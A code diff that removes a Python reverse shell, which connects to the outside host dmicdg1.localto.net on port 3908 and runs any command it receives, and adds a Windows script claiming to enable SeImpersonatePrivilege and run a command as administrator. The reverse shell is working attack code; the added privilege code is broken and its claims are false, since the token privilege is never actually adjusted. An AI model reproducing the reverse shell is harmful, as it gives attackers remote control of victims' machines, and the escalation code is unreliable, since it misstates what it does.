@@ -1,33 +1,28 @@
-import socket
-import subprocess
 import os
+import ctypes
+import sys
 
-# إعداد معلومات الاتصال
-HOST = 'dmicdg1.localto.net'
-PORT = 3908
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+if len(sys.argv) < 2:
+    print("Usage: python script.py <command>")
+    sys.exit(1)
 
-# إرسال رسالة عند نجاح الاتصال
-s.send(b"[*] Connection Established!\n")
+# Get the current process token
+token = ctypes.c_void_p()
+ctypes.windll.kernel32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(token))
 
-while True:
-    # إرسال الدليل الحالي
-    s.send(os.getcwd().encode() + b"> ")
-    data = s.recv(1024).decode("utf-8").strip()
+# Set the privilege to SeImpersonatePrivilege
+SE_IMPERSONATE_NAME = "SeImpersonatePrivilege"
+luid = ctypes.c_void_p()
 
-    if data.lower() == "quit":
-        break
-    elif data.startswith("cd"):
-        try:
-            os.chdir(data.split(" ")[1])
-        except FileNotFoundError as e:
-            s.send(str(e).encode())
-    else:
-        # تنفيذ الأمر وإرسال النتائج
-        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        stdout_value, stderr_value = proc.communicate()
-        output_str = stdout_value + stderr_value
-        s.send(output_str)
+# Lookup the privilege
+ctypes.windll.advapi32.LookupPrivilegeValueW(None, SE_IMPERSONATE_NAME, ctypes.byref(luid))
 
-s.close()
+# Enable the privilege
+tkp = ctypes.c_void_p()
+tkpPrivilege = ctypes.create_string_buffer(8)
+tkpPrivilege = ctypes.cast(tkpPrivilege, ctypes.POINTER(ctypes.c_void_p))
+ctypes.windll.advapi32.SetTokenInformation(token, 20, ctypes.byref(luid), 0)
+
+# Run the command as an administrator
+command = sys.argv[1]
+os.system(command)
